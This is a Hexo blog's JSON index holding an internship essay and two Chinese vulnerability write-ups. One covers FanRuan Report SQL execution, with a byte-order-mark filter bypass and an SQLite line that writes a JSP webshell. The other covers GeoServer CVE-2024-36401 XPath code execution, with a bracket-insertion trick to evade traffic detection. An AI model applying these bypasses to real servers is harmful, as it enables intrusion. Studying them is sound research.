{"meta":{"title":"Y4tacker:Hacking The World!","subtitle":"","description":"","author":"Y4tacker","url":"https://y4tacker.github.io","root":"/"},"pages":[{"title":"文章归档","date":"2024-08-04T09:01:49.929Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"archive.html","permalink":"https://y4tacker.github.io/archive.html","excerpt":"","text":""},{"title":"","date":"2024-08-04T09:01:49.930Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"google4e6948178b5b9b74.html","permalink":"https://y4tacker.github.io/google4e6948178b5b9b74.html","excerpt":"","text":"google-site-verification: google4e6948178b5b9b74.html"},{"title":"About me","date":"2022-02-02T13:39:44.000Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"about/index.html","permalink":"https://y4tacker.github.io/about/index.html","excerpt":"","text":"👋Hi，I’am Y4tacker 宁静致远，淡泊明志 🔭 CTFer: @0x401 Team(The third captain)/@R3kapig(Member) ⭐️ Github: https://github.com/Y4tacker 🍔 Blog: http://y4tacker.github.io/ 💡 Alibaba Coud"},{"title":"links","date":"2013-07-13T12:46:25.000Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"friend.html","permalink":"https://y4tacker.github.io/friend.html","excerpt":"","text":""},{"title":"article","date":"2022-02-02T09:01:52.000Z","updated":"2024-08-04T09:01:49.929Z","comments":true,"path":"article/index.html","permalink":"https://y4tacker.github.io/article/index.html","excerpt":"","text":""},{"title":"友链","date":"2022-07-09T14:57:33.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"link/index.html","permalink":"https://y4tacker.github.io/link/index.html","excerpt":"","text":"Web 4ra1n: 许少！！！ 远海 : 凡是过往,皆为序章. rayzz: just do it. ek1ng: YESTERDAY YOU SAID TOMORROW. Snakinya: 苍山负雪，明烛天南. 曾哥: 弱小和无知不是生存的障碍，傲慢才是！ MiaoTony: 仰望星空，脚踏实地，未来可期. R3gr3t: 战队Web师傅&amp;学弟. Binary Minhal: 战队逆向师傅&amp;学长 CrazyMan: 空白！！！ apeng: Reverse Everything xia0ji233: 老当益壮，宁移白首之心？穷且益坚，不坠青云之志."},{"title":"分类","date":"2018-01-04T16:00:00.000Z","updated":"2024-08-04T09:01:49.930Z","comments":true,"path":"categories/index.html","permalink":"https://y4tacker.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2023-12-10T08:11:53.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"search/index.html","permalink":"https://y4tacker.github.io/search/index.html","excerpt":"","text":""},{"title":"标签","date":"2018-01-04T16:00:00.000Z","updated":"2024-08-04T09:01:49.932Z","comments":true,"path":"tags/index.html","permalink":"https://y4tacker.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"保研or就业---阿里云实习之旅","slug":"year/2022/10/保研or就业---阿里云实习之旅","date":"2024-08-04T09:01:49.064Z","updated":"2024-08-04T09:01:49.064Z","comments":true,"path":"2024/08/04/year/2022/10/保研or就业---阿里云实习之旅/","link":"","permalink":"https://y4tacker.github.io/2024/08/04/year/2022/10/%E4%BF%9D%E7%A0%94or%E5%B0%B1%E4%B8%9A---%E9%98%BF%E9%87%8C%E4%BA%91%E5%AE%9E%E4%B9%A0%E4%B9%8B%E6%97%85/","excerpt":"","text":"保研or就业 — 阿里云实习之旅始章​ 昨天刚回成都，之前一直在问自己结果真的有那么重要吗，现在我也能鼓起勇气对自己说，不重要了，我的世界属于我，我的人生也没有那么多的观众，我也没必要在意他人的目光，我终于又成长了一点。 实习经历​ （经历这部分就挑着重点的或者和时间性有关的说说，我也懒） ​ 七月中旬收拾好行李独自前往一个陌生的城市，起初对杭州的影响也就是赛博群里说的饭不好吃，说我这个成都人一定不习惯(Ps:不过外卖还是很不错的)，到了杭州浅浅收视了下房间，便被徐师叫出去干饭了，主管确实是一个很好也很热情的人，在吃饭过程中帮助我开始熟悉环境，也在这个过程中有了对工作的简单认知(Ps:至少知道了咋是做Waf产品和RASP产品). ​ 第一天刚上班的时候，懵懵懂懂不知道干什么，索性在公司发的新电脑上边配置环境边研究着来之前没搞完的安全研究。到了第二天，主管拉我去开会帮助我确定了我实习期间的内容，总体而言还是很好的，给了我很多自由发展的空间。有着公司提供的各种资源，第一个月也是我技术成长最快的时候；一方面我很喜欢研究新的东西，另一方面我还是和以前一样的无所顾忌。当然这时候的我也不喜欢思考只想着这个技术点有意思就研究它，毕竟在我心里一直以来的想法都是我就认认真真搞个技术，需要考虑那么多么。在第一个月的实习过程中，也凭借着自己的努力帮助产品找到了一些潜在隐患，在工作方面也得到了师兄的认可。 ​ 转眼到了第二个月，秋招来了，但秋招和我其实一直没啥关系，毕竟每天上下班时间里我也不可能去面试，那时听说八月是提前批，虽然自己没办法参加秋招但不影响我好奇一些整体的情况，于是乎打开了脉脉开始了我的心态之旅(Ps:脉脉治好了我的精神内耗，也让我成长了不少)，和我想的一样，今年整体形势并不乐观，很多人在上面埋怨怎么怎么滴不好。那时候我也没想很多，偶尔也会拿着图去群里调侃，后来渐渐吃瓜吃到了自己，看到了阿里的一些消息，我也开始逐渐担心起自己来了，担心自己没时间面试其他公司如果这边没过怎么办，在中途我也向主管表示过我的担心，尽管主管也拉我谈过话我也没法消除这个疑虑，毕竟很现实的问题我至少得有个工作吧，当然其实这时候这方面想法对我影响并不大，毕竟秋招才到提前批，时间接着往下走终于到了正式批，这时候我又看到了另一个消息，“阿里云今年卡本科学历，不是硕士不能参加转正答辩”，这时候噩梦终于开始了，毕竟听到这个消息时九月已经过了1/3了，这时候我也经常和师兄吐槽xxx，徐师也找过我帮我缓解了一些焦虑，我也继续做着我的实习工作，在这期间也向补天白帽大会投了自己的议题，很高兴的也过了审核。 ​ 到了第三个月，我也顺理成章收到了准备转正答辩的事情，不得不说徐师人真的很好，其实我平时是很少做PPT的，做的话也是那种凑合着能用的类型，毕竟在学校期间我通常也只是技术输出，并不喜欢花很多时间到文稿上。在这期间主管和师兄确实帮了我很多，前有师兄帮助梳理逻辑，后有徐师手把手修改我的PPT。之后也顺利参加了转正答辩，虽然效果不是很好，毕竟我也很难从一个纯技术人的角度做快速的转变，对讲PPT我也只是个新人。答辩完以后我也书归正传继续自己的一些学习研究，时间就这样走着终于最后一个导火索来了，在看到阿里实习群里小伙伴说，“阿里云今年本科生转正需要特批，基本不可能“，这一点最终也被大主管得到了证实，我也终于绷不住了，眼泪也流了下来，为什么会哭？原因很简单就是世界观的崩塌。我这么多年的努力真的就白费了么？当年我的选择不就是放弃学习努力学技术然后工作么？不是说好了只要技术ok一切都会好的么？我不断反问自己，一直没法说服自己，这个时间也是我最迷茫的时刻，还好我的主管和师兄也没有因为这件事放弃我，我也如愿走了特批流程，至于结果就慢慢等吧，take it easy，毕竟也不是我能决定的，我做好我的一切就够了。某天晚上骑车回家的路上想起了大二的自己，那时候无畏，敢冲撞，有力量，敢放弃已有的成绩，投身技术，那时候每天起早贪黑只有一个目标，变强，从来也不为结果，但自从实习开始一方面因为周围的负面情绪开始腐化了自己，另一方面一直以来也有些许的精神内耗，忘了自己的本心。 为什么还是选择了就业​ 在这期间也发生了一件事，因此也单独列在最后了，虽然确实从大二开始，由于当时决定放弃保研准备工作，因而我平时上课也没听课，期末也就是靠着一个月的时间简单看看课本了解下名词，成绩也不算好，一不小心就保研了也很意外，在最终决定是否接受这个保研名额的那一天也正好是主管问我是否决定特批的那一天，一切都是那么巧合，主管确实人也很好，告诉我先别下结论他帮我了解下特批成功率大不大，不过在主管离开的那一刻我也并没有犹豫多久，写了一份放弃保研资格的说明到了学院，虽然我也不知道自己转正成功率如何，但我想当我在放弃保研资格上写下最后署名的那一刻起，我也不再迷茫了，毕竟我也不喜欢那种一眼就能看到底的生活，我还是那么的喜欢冒险，喜欢未知，在这之后赛博群很多人都说我应该选择读研，也给我讲了读研的好处。但谁叫我从小就是个特立独行的主呢？虽然我的选择也不一定正确，但至少符合我的当下。少年是不需要向生活妥协的，原因嘛？我还狠年轻，我也不想留下遗憾。 终章​ 回想起来这段时间成长无疑是迅速的 ​ 对于技术有了更多维度的思考，开始从臆想阶段发生转变，慢慢开始思考眼下做的东西具体意义是什么，是否能解决一些具体问题，当然这方面也只是刚起步，我也仍在不断学习。 ​ 对于生活，有了更多的体验，迈出了很多的第一步，买了第一辆公路车，有了自己的小相机。 ​ 当然最主要的是彻底治好了我的精神内耗，从大学起搞出来的老毛病，间歇性担心某个结果，忽略了过程的意义。经过实习这一遭基本是完全治好了，尽管到目前为止也看着身边阿里的实习朋友们都拿到了意向，虽然我这边也一直没动静，但这又有什么关系呢，我已经尽力做到了自己的最好，这就足够了。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://y4tacker.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"某软Report高版本中利用的一些细节","slug":"year/2024/7/某软Report高版本中利用的一些细节","date":"2024-07-23T15:21:43.000Z","updated":"2024-07-26T06:29:40.000Z","comments":true,"path":"2024/07/23/year/2024/7/某软Report高版本中利用的一些细节/","link":"","permalink":"https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/","excerpt":"","text":"本文以目前官网的最新版为例，poc估计大家都有了，这里猥琐发育仅以思路分享为主 原理浅析从官方公告的细节不难看出，一是让我们删除sqlite驱动，二是限制相关路由的访问，关于路由其实是比较烦人的，这个系统在高版本其实都是基于注解做的配置，所以寻找起来会相对麻烦，通过一番查找我们不难发现在猥琐发育.web.controller.ReportRequestCompatibleService中 在代码中不难发现直接对我们的queryString放在了模板渲染的函数处理当中 知道这一点我们可以简单进行测试，不难发现确实成功做了解析 到这里如果了解过一些历史漏洞的，结合公告的sqlite，应该也很容易想到一些内置函数的利用，而这里我们用到的则是sql函数(对应猥琐发育.function.SQL，有兴趣可以自己看看)，因此便很容易通过此路径执行任意SQL的查询 坑点坑点一(queryString中的特殊字符处理)当我们兴高采烈的去尝试执行利用一波的时候，会发现页面报错，当然熟悉Java的朋友可能一眼就知道为什么，tomcat禁止直接传入一些特殊字符，在我们sql执行当中可能用到的就是双引号与空格了 解决方案一: 既然不能使用某些特殊字符，我们很容易想到能不能通过url编码传入这些特殊字符，毕竟tomcat是支持对参数解码的，但很可惜的是这里用到的是request.getQueryString()，它得到的内容则是解码前的，因此这个思路很快就被否决了 解决方案二： 很显然通常来说我们第一个容易想到的就是用字符替代的方案，双引号用单引号凑合，空格用注释符替换，但在这个场景下并不是很实用，原因就是如果我们本身执行的sql中需要用到引号，那么就没办法了 解决方案三： 既然替代的方式不行，那么第二个我们很容易想到，既然是模板，那会不会有其他一些内置函数能够帮助我们解决这个困难，答案是“是”，在官网中很容易发现存在这样一个内置函数Decode(对应猥琐发育.function.DECODE)，他可以帮助我们完成解码，从代码中也能看到仅能帮助我们完成url解码，但这也足够了 简单测试，这里我们的select 1成功执行 坑点二(高版本对DDL/DML语句存在执行限制)这时候我们自以为解决了一切，高兴的使用attach语句完成shell的落地，高兴的输入，但发现什么都没有发生 1attach database &#x27;../webapps/webroot/y4tacker.jsp&#x27; as &#x27;yyds&#x27;; 为了排查自然而然的我们肯定会先查看日志，对于某软系统其日志通常在如下位置 日志类型 日志存储 日志内容 系统日志 默认存储在%FR_HOME%\\logs\\fanruan.log 设计器端允许修改日志存储位置服务器端不允许修改日志存储位置 记录系统运行过程中的一些信息 操作日志 存储在%FR_HOME%\\webapps\\webroot\\logs\\cubes允许修改日志存储位置11.0.4及之后版本支持实时备份 记录普通用户和管理员的使用动作 补充日志 存储在%FR_HOME%\\bin\\error.txt不允许修改日志存储位置 记录设计器预期外的报错 很快在fanruan.log当中，我们便能发现这样一条报错DDL/DML query is not permitted 这时候怎么办，很显然我们需要看看函数是如何处理的，通过报错的堆栈我们很容易发现具体的处理在猥琐发育.data.core.db.dialect.base.key.create.executequery.DialectExecuteSecurityQueryKey.execute 第一眼不难看出，这里有一个checkQuery的函数 1234567891011public ResultSet execute(DialectExecuteQueryParameter dialectExecuteQueryParameter, Dialect current) throws SQLException &#123; String sql = dialectExecuteQueryParameter.getSql(); try &#123; this.checkQuery(sql); &#125; catch (SQLException var5) &#123; throw new SQLException(&quot;DDL/DML query is not permitted for current database, or exist forbidden elements.&quot;); &#125; return dialectExecuteQueryParameter.getStatement().executeQuery(dialectExecuteQueryParameter.getSql());&#125; 其通过猥琐发育.cbb.dialect.security.JDBCSecurityChecker#checkQuery(String)处理，查看具体逻辑 第一步，调用removeSpecialCharacters去除某些特殊字符 第二部，调用check继续检查参数 1234567891011public static void checkQuery(String query) throws SQLException &#123; checkQuery(query, &quot;&quot;); &#125;public static void checkQuery(String query, String dbType) throws SQLException &#123; checkQuery(query, InsecurityElementFactory.getSqlElements(dbType));&#125;private static void checkQuery(String query, InsecurityElement[] keywords) throws SQLException &#123; query = removeSpecialCharacters(query); check(query, keywords);&#125; 先来看看第一步，逻辑很简单主要是先去除引号以及注释符等 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879private static String removeSpecialCharacters(String originalQuery) &#123; if (StringUtils.isEmpty(originalQuery)) &#123; return originalQuery; &#125; else &#123; String query = ignoreQuotesAndNotes(originalQuery.toLowerCase()); StringBuilder result = new StringBuilder(); for(int i = 0; i &lt; query.length(); ++i) &#123; char nextChar = isSpecialCharacter(query.charAt(i)) ? 32 : query.charAt(i); result.append(nextChar); &#125; return result.toString(); &#125;&#125;private static String ignoreQuotesAndNotes(String originalString) &#123; StringBuilder result = new StringBuilder(); char quote = &#x27;0&#x27;; int noteType = false; int position = 0; while(true) &#123; while(position &lt; originalString.length()) &#123; char curChar = originalString.charAt(position); if (isQuote(quote)) &#123; if (curChar == quote) &#123; quote = &#x27;0&#x27;; result.append(&quot; &quot;); &#125; ++position; &#125; else if (noteType) &#123; if (noteType) &#123; if (curChar == &#x27;\\n&#x27;) &#123; noteType = false; result.append(&quot; &quot;); &#125; &#125; else if (position + 1 &lt; originalString.length() &amp;&amp; originalString.charAt(position) == &#x27;*&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;/&#x27;) &#123; noteType = false; result.append(&quot; &quot;); ++position; &#125; ++position; &#125; else &#123; if (position + 1 &lt; originalString.length()) &#123; if (originalString.charAt(position) == &#x27;-&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;-&#x27;) &#123; noteType = true; result.append(&quot; &quot;); position += 2; continue; &#125; if (originalString.charAt(position) == &#x27;/&#x27; &amp;&amp; originalString.charAt(position + 1) == &#x27;*&#x27;) &#123; noteType = true; result.append(&quot; &quot;); position += 2; continue; &#125; &#125; if (isQuote(curChar)) &#123; result.append(&quot; &quot;); quote = curChar; ++position; &#125; else &#123; result.append(curChar); ++position; &#125; &#125; &#125; return result.toString(); &#125;&#125;private static boolean isSpecialCharacter(char c) &#123; return c == &#x27;,&#x27; || c == &#x27;\\n&#x27; || c == &#x27;;&#x27; || c == &#x27;\\t&#x27; || c == &#x27;\\r&#x27; || c == &#x27;\\f&#x27; || c == 11;&#125; 关键还是得看第二步 123456789101112131415private static void check(String query, InsecurityElement[] keywords) throws SQLException &#123; if (StringUtils.isNotEmpty(query) &amp;&amp; ArrayUtils.isNotEmpty(keywords)) &#123; InsecurityElement[] var2 = keywords; int var3 = keywords.length; for(int var4 = 0; var4 &lt; var3; ++var4) &#123; InsecurityElement insecurityElement = var2[var4]; String probedInsecurityStr; if ((probedInsecurityStr = insecurityElement.probed(query)) != null) &#123; throw new SQLException(insecurityElement.msg(probedInsecurityStr)); &#125; &#125; &#125;&#125; 通过简单的调试可以发现keywords是以下几个关键词 接下来重点看insecurityElement.probed的处理，insecurityElement是一个抽象类，从上面的debug信息我们能很快定位到其对应的实现类为猥琐发育.cbb.dialect.security.element.InsecuritySQLKeyword，一眼我们就能想到，只要达成不包含条件即可， 1234567891011121314public class InsecuritySQLKeyword extends InsecurityElement &#123; public InsecuritySQLKeyword(String keyWord) &#123; super(keyWord); &#125; public String probed(String sql) &#123; String tmp = &quot; &quot; + sql + &quot; &quot;; return tmp.contains(&quot; &quot; + this.getPattern() + &quot; &quot;) ? this.getPattern() : null; &#125; public String msg(String insecurityElement) &#123; return InterProviderFactory.getProvider().getLocText(&quot;Fine-Core_JDBC_Validation_Query_keywords_Not_Permitted&quot;, new String[]&#123;this.getPattern()&#125;); &#125;&#125; 但由于前面removeSpecialCharacters的相关处理，删除注释，去除引号中的字符，转小写，删除部分特殊字符 整理以上思路我们不难排除注释、引号、转小写等都不可用，只剩下一些特殊字符可以排上用场，再次回顾这个函数，发现他删除的空白字符仅有四个，这时候我们可以尝试fuzz看看%00-%20中的字符那些可以利用，但很可惜简单尝试了下没成功 123private static boolean isSpecialCharacter(char c) &#123; return c == &#x27;,&#x27; || c == &#x27;\\n&#x27; || c == &#x27;;&#x27; || c == &#x27;\\t&#x27; || c == &#x27;\\r&#x27; || c == &#x27;\\f&#x27; || c == 11;&#125; 其实这是符合我们预期的，通过文档我们也不难发现sqlite支持的空白字符，确实仅有以下五种(包含空格) 1SPACES : [ \\u000B\\t\\r\\n] -&gt; channel(HIDDEN); 这时候怎么办呢，这里介绍一个小trick，在sqlite相关的代码文档中写了这样一句话https://android.googlesource.com/platform//external/sqlite/+/d11514d85b96ef33b1a78080246df7df2cf5d9ea/dist/orig/sqlite3.h 在这里我们只需要关注前面一句话即可，简单来说如果第一个字符存在U+FEFF，那么会被移除 123456789** [[byte-order determination rules]] ^The byte-order of** UTF16 input text is determined by the byte-order mark (BOM, U+FEFF)** found in first character, which is removed, or in the absence of a BOM** the byte order is the native byte order of the host** machine for sqlite3_bind_text16() or the byte order specified in** the 6th parameter for sqlite3_bind_text64().)^** ^If UTF16 input text contains invalid unicode** characters, then SQLite might change those invalid characters** into the unicode replacement character: U+FFFD. 这一次利用这个trick，我们成功通过了校验 也完成了文件的落地 坑点三写文件后，发现不能解析jsp，玩个蛋，jasper依赖也没有，最后发现应该仅影响linux版本 具体看官方文档就知道了:https://help.fanruan.com/finereport/doc-view-822.html","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"}]},{"title":"浅析GeoServer property 表达式注入代码执行(CVE-2024-36401)","slug":"year/2024/7/浅析GeoServer-property-表达式注入代码执行-CVE-2024-36401","date":"2024-07-03T08:08:26.000Z","updated":"2024-07-04T02:32:32.000Z","comments":true,"path":"2024/07/03/year/2024/7/浅析GeoServer-property-表达式注入代码执行-CVE-2024-36401/","link":"","permalink":"https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/","excerpt":"","text":"漏洞复现分析从公告来看，漏洞来源于geotools这个库使用apache xpath解析xpath导致的问题 https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv https://github.com/geotools/geotools/pull/4797 https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w 之后简单看看geotools的commit可以发现有很多 https://github.com/geotools/geotools/pull/4797/commits/e53e5170ba71521728875a436c80616cfb03c1e8 比如，从上到下依次看有很多能触发的方式，这里我们简单有个印象即可 1234567rg.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String) 再看geoserver的公告，以下这些都能被利用 首先以最简单的GetPropertyValue为例，从官方文档可以看到具体的使用方法，https://docs.geoserver.org/latest/en/user/services/wfs/reference.html#getpropertyvalue 我比较懒找了个之前的老环境代码方便我本地调试 https://versaweb.dl.sourceforge.net/project/geoserver/GeoServer/2.21.3/geoserver-2.21.3-war.zip?viasf=1 可以看到在org.geoserver.wfs.GetPropertyValue#run，红框中的代码从请求中获取了valuereference参数，之后调用工厂类的property方法获取PropertyName对象 我们来看看这个工厂类的调用，直接返回一个被AttributeExpressionImpl包装的对象 同时实例化时将参数赋给attPath 接下来再来看看evaluate的调用，在这里会通过PropertyAccessors.findPropertyAccessors获取合适的属性访问器，之后遍历调用其get方法，其中就包括了org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get，官方公告列出来的就有这个 在下面的代码中可以解析xpath表达式，因此从上面分析下来这个xpath就是valuereference中的值，整个流程也就走通了 路由分析同时像我这种好奇宝宝一般是比较好奇一些路由方法的调用，就比如为什么通过参数中的request能调用对应方法，这个项目主体框架是spring 以我下载的war为例，先看web.xml，通常而言这就是我们项目的主入口，但是点进去一看，在配置文件中大多只有Servlet的过滤器链的配置，而没有具体接口的配置，当然唯一的可以看到将请求都通过spring的DispatcherServlet派发 123456789101112&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;&lt;servlet&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;&lt;/servlet&gt; &lt;!-- single mapping to spring, this only works properly if the advanced dispatch filter is active --&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;dispatcher&lt;/servlet-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 因此接下来我们就得看看，spring项目的一些其他配置文件，比如\\geoserver\\WEB-INF\\lib\\gs-wfs-2.21.3.jar!\\applicationContext.xml，看着这个配置文件就会更为亲切，当然又扯远了，回到正文 在这个项目中，org.geoserver.ows.Dispatcher继承了AbstractController并实现了handleRequestInternal方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200protected ModelAndView handleRequestInternal(HttpServletRequest httpRequest, HttpServletResponse httpResponse) throws Exception &#123; this.preprocessRequest(httpRequest); Request request = new Request(); request.setHttpRequest(httpRequest); request.setHttpResponse(httpResponse); Service service = null; try &#123; try &#123; request = this.init(request); REQUEST.set(request); Object result; try &#123; service = this.service(request); &#125; catch (Throwable var11) &#123; this.exception(var11, (Service)null, request); result = null; return (ModelAndView)result; &#125; if (request.getError() != null) &#123; throw request.getError(); &#125; Operation operation = this.dispatch(request, service); request.setOperation(operation); if (request.isSOAP()) &#123; this.flagAsSOAP(operation); &#125; result = this.execute(request, operation); if (result != null) &#123; this.response(result, request, operation); return null; &#125; &#125; catch (Throwable var12) &#123; if (isSecurityException(var12)) &#123; throw (Exception)var12; &#125; this.exception(var12, service, request); &#125; return null; &#125; finally &#123; this.fireFinishedCallback(request); REQUEST.remove(); &#125;&#125;Object execute(Request req, Operation opDescriptor) throws Throwable &#123; Service serviceDescriptor = opDescriptor.getService(); Object serviceBean = serviceDescriptor.getService(); Object[] parameters = opDescriptor.getParameters(); Object result = null; try &#123; if (serviceBean instanceof DirectInvocationService) &#123; String operationName = opDescriptor.getId(); result = ((DirectInvocationService)serviceBean).invokeDirect(operationName, parameters); &#125; else &#123; Method operation = opDescriptor.getMethod(); result = operation.invoke(serviceBean, parameters); &#125; &#125; catch (Exception var8) &#123; if (var8.getCause() != null) &#123; throw var8.getCause(); &#125; throw var8; &#125; return this.fireOperationExecutedCallback(req, opDescriptor, result);&#125;Operation dispatch(Request req, Service serviceDescriptor) throws Throwable &#123; if (req.getRequest() == null) &#123; String msg = &quot;Could not determine geoserver request from http request &quot; + req.getHttpRequest(); throw new ServiceException(msg, &quot;MissingParameterValue&quot;, &quot;request&quot;); &#125; else &#123; boolean exists = this.operationExists(req, serviceDescriptor); if (!exists &amp;&amp; req.getKvp().get(&quot;request&quot;) != null) &#123; req.setRequest(normalize(KvpUtils.getSingleValue(req.getKvp(), &quot;request&quot;))); exists = this.operationExists(req, serviceDescriptor); &#125; Object serviceBean = serviceDescriptor.getService(); Method operation = OwsUtils.method(serviceBean.getClass(), req.getRequest()); if (operation != null &amp;&amp; exists) &#123; Object[] parameters = new Object[operation.getParameterTypes().length]; for(int i = 0; i &lt; parameters.length; ++i) &#123; Class&lt;?&gt; parameterType = operation.getParameterTypes()[i]; if (parameterType.isAssignableFrom(HttpServletRequest.class)) &#123; parameters[i] = req.getHttpRequest(); &#125; else if (parameterType.isAssignableFrom(HttpServletResponse.class)) &#123; parameters[i] = req.getHttpResponse(); &#125; else if (parameterType.isAssignableFrom(InputStream.class)) &#123; parameters[i] = req.getHttpRequest().getInputStream(); &#125; else if (parameterType.isAssignableFrom(OutputStream.class)) &#123; parameters[i] = req.getHttpResponse().getOutputStream(); &#125; else &#123; Object requestBean = null; Throwable t = null; boolean kvpParsed = false; boolean xmlParsed = false; if (req.getKvp() != null &amp;&amp; req.getKvp().size() &gt; 0) &#123; try &#123; requestBean = this.parseRequestKVP(parameterType, req); kvpParsed = true; &#125; catch (Exception var14) &#123; t = var14; &#125; &#125; if (req.getInput() != null) &#123; requestBean = this.parseRequestXML(requestBean, req.getInput(), req); xmlParsed = true; &#125; if (requestBean == null) &#123; if (t != null) &#123; throw t; &#125; if ((!kvpParsed || !xmlParsed) &amp;&amp; (kvpParsed || xmlParsed)) &#123; if (kvpParsed) &#123; throw new ServiceException(&quot;Could not parse the KVP for: &quot; + parameterType.getName()); &#125; throw new ServiceException(&quot;Could not parse the XML for: &quot; + parameterType.getName()); &#125; throw new ServiceException(&quot;Could not find request reader (either kvp or xml) for: &quot; + parameterType.getName() + &quot;, it might be that some request parameters are missing, please check the documentation&quot;); &#125; Method setBaseUrl = OwsUtils.setter(requestBean.getClass(), &quot;baseUrl&quot;, String.class); if (setBaseUrl != null) &#123; setBaseUrl.invoke(requestBean, ResponseUtils.baseURL(req.getHttpRequest())); &#125; if (requestBean != null) &#123; if (req.getService() == null) &#123; req.setService(this.lookupRequestBeanProperty(requestBean, &quot;service&quot;, false)); &#125; if (req.getVersion() == null) &#123; req.setVersion(normalizeVersion(this.lookupRequestBeanProperty(requestBean, &quot;version&quot;, false))); &#125; if (req.getOutputFormat() == null) &#123; req.setOutputFormat(this.lookupRequestBeanProperty(requestBean, &quot;outputFormat&quot;, true)); &#125; parameters[i] = requestBean; &#125; &#125; &#125; if (this.citeCompliant) &#123; if (!&quot;GetCapabilities&quot;.equalsIgnoreCase(req.getRequest())) &#123; if (req.getVersion() == null) &#123; throw new ServiceException(&quot;Could not determine version&quot;, &quot;MissingParameterValue&quot;, &quot;version&quot;); &#125; if (!req.getVersion().matches(&quot;[0-99].[0-99].[0-99]&quot;)) &#123; throw new ServiceException(&quot;Invalid version: &quot; + req.getVersion(), &quot;InvalidParameterValue&quot;, &quot;version&quot;); &#125; boolean found = false; Version version = new Version(req.getVersion()); Iterator var20 = this.loadServices().iterator(); while(var20.hasNext()) &#123; Service service = (Service)var20.next(); if (version.equals(service.getVersion())) &#123; found = true; break; &#125; &#125; if (!found) &#123; throw new ServiceException(&quot;Invalid version: &quot; + req.getVersion(), &quot;InvalidParameterValue&quot;, &quot;version&quot;); &#125; &#125; if (req.getService() == null) &#123; throw new ServiceException(&quot;Could not determine service&quot;, &quot;MissingParameterValue&quot;, &quot;service&quot;); &#125; &#125; Operation op = new Operation(req.getRequest(), serviceDescriptor, operation, parameters); return this.fireOperationDispatchedCallback(req, op); &#125; else &#123; String msg = &quot;No such operation &quot; + req; throw new ServiceException(msg, &quot;OperationNotSupported&quot;, req.getRequest()); &#125; &#125;&#125; 从上面的代码中我们很容易发现，通过dispatch的代码我们很容易发现会通过这个request对象查找对应的方法，获取到后之后再通过execute执行，因此答案也就有了 当然这个方法可以仔细看看对请求的解析部分，里面对多种请求方式的解析也可以了解了解 一些具体的流程可参考如下逻辑 后话相比较其他利用还是觉得GetProperty的利用比较舒服，不像GetFeature之类的里面到处都是触发点，会导致xpath被解析很多次，当然poc就不贴了学习思路为主，在GetProperty中也有一个比较好用的对抗流量设备的点 在这里可以看到在获取参数时会把[]中的内容替换为空，但很可惜是贪婪匹配(至少我这个老代码是这样的)，不过也可以拿来做一些利用，比如我们的java.lang.Runtime可以写成java.lang.Ru[Hacked By Y4]ntime 1PropertyName propertyNameNoIndexes = this.filterFactory.property(request.getValueReference().replaceAll(&quot;\\\\[.*\\\\]&quot;, &quot;&quot;), this.getNamespaceSupport()); 依然是可以触发的 凌晨了，洗洗睡了… 